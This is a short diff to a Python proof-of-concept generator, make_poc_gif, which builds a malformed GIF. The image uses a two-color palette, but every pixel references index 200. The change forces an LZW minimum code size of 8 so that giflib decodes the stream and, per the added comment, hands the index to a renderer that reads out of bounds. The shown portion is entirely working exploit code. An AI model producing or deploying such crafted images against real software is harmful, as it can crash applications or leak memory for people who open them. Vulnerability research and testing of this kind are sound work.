@@ -149,8 +149,16 @@ def make_poc_gif(width=16, height=16, oob_index=200):
     out += bytes([0x00])
     
     # Image Data
-    # LZW minimum code size — must be at least 2 for a 2-color palette
-    lzw_min = 2
+    # LZW minimum code size — must be large enough to encode oob_index as
+    # a literal symbol.  With lzw_min=8 the initial code table holds indices
+    # 0-255, so index 200 is a valid literal.  The GCT only has 2 entries,
+    # but the GIF spec allows the LZW min code size to be larger than what
+    # the palette requires.  giflib will happily decompress the stream and
+    # hand index 200 to the renderer, which then does the OOB read.
+    lzw_min = max(2, (oob_index).bit_length())
+    if lzw_min > 8:
+        raise ValueError("oob_index too large for GIF LZW (max 255)")
+    lzw_min = 8  # always use 8 so all byte-range indices are valid literals
     out += bytes([lzw_min])
     
     # Create pixel data: all pixels have index `oob_index` (e.g., 200)
